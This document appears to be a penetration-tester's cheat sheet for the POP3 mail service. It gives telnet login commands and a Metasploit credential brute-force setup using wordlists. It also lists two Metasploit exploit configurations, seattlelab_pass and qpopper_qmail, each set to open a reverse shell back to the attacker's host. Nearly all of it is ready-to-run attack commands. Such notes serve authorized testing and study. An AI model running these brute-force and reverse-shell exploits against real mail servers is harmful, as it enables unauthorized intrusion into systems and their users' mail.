# POP3

## Enumeration
- requires credentials to interact with and fetch emails.
- could indicate other mail ports are open. Use a local mail client to interact with them.

##### telnet
```bash
telnet [IP] 110
USER [USER]@[IP]
PASS [PASS]
```

### Metasploit

##### pop3_version
```bash
use auxiliary/scanner/pop3/pop3_version
set RHOSTS [IP]
set RPORT 110
run
```

##### pop3_login
```bash
use auxiliary/scanner/pop3/pop3_login
set RHOSTS [IP]
set RPORT 110
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
run
```


---
---


## Exploitation

### Metasploit

##### seattlelab_pass
```bash
use exploit/windows/pop3/seattlelab_pass
set RHOSTS [IP]
set RPORT 110
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [YourIP]
run
```

##### qpopper_qmail
```bash
use exploit/linux/pop3/qpopper_qmail
set RHOSTS [IP]
set RPORT 110
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST [YourIP]
run
```
